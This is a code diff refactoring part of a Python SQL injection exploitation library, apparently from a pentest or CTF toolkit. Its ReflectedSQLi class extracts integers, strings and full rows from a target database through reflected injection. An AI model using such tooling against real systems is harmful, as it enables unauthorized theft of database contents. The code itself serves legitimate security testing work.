@@ -5,7 +5,8 @@ import string
 class SQLi(ABC):
 
     @staticmethod
-    def build_query(column: str, table=None, condition=None, offset=None):
+    def build_query(column: str|list, table=None, condition=None, offset=None):
+        column = column if isinstance(column, str) else ",".join(column)
         condition = "" if not condition else f" WHERE {condition}"
         offset = "" if offset is None else f" OFFSET {offset}"
         table = "" if not table else f" FROM {table}"
@@ -76,10 +77,9 @@ class ReflectedSQLi(SQLi, ABC):
         pass
 
     def extract_int(self, column: str, table=None, condition=None, offset=None, verbose=False):
-        query_columns = [column] + list(map(str, range(2, len(self.column_types) + 1)))
-        return int(self.reflected_sqli(query_columns, table, condition, offset)[0])
+        return int(self.extract_string(column, table, condition, offset))
 
-    def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False):
+    def extract_string(self, column: list|str, table=None, condition=None, offset=None, verbose=False):
         if str not in self.column_types:
             print("[!] Reflectd SQL does not reflect string types, only:", self.column_types)
             return None
@@ -137,12 +137,13 @@ class ReflectedSQLi(SQLi, ABC):
             query_columns[offset] = column
             offset += 1
 
+        column_str = ",".join(query_columns) 
+        # todo: fix count(*) for distinct
         row_count = self.extract_int(f"COUNT(*)", table=table, condition=condition, verbose=verbose)
         if verbose:
             print(f"Fetching {row_count} rows")
 
         rows = []
-        column_str = ",".join(query_columns)
         for i in range(0, row_count):
             row = self.reflected_sqli(query_columns, table, condition, i, verbose=verbose)
             if one:
